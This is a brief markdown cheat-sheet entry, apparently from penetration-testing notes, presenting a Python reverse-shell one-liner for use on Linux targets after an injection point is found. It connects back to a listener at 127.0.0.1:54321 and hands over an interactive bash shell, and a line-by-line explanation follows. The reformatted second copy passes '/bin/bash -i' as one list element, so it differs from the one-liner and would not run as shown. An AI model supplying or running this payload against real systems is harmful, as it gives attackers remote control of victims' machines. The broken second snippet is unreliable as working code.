# Python Reverse Shell
Can be used when 
* an injection point is found
* the victim is Linux, and;
* Python is installed

### One Liner

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",54321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

#### Explanation 
It uses Linux [file descriptor](https://stackoverflow.com/q/5256599) to redirect socket [to/from stdin/stdout/stderr](https://stackoverflow.com/a/45517227). 

```python
# the same code but better formatted
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("127.0.0.1",54321))

os.dup2(s.fileno(),0)   # standard input
os.dup2(s.fileno(),1)   # standard output
os.dup2(s.fileno(),2)   # standard error

# make "/bin/bash" a subprocess of the parent process
subprocess.call(["/bin/bash -i"])
```
Process tree can be printed by running `$ ps -aef --forest`: 
![pocess](https://user-images.githubusercontent.com/39619599/119069840-e0b2d400-b9b4-11eb-8311-0d56424763d1.png)
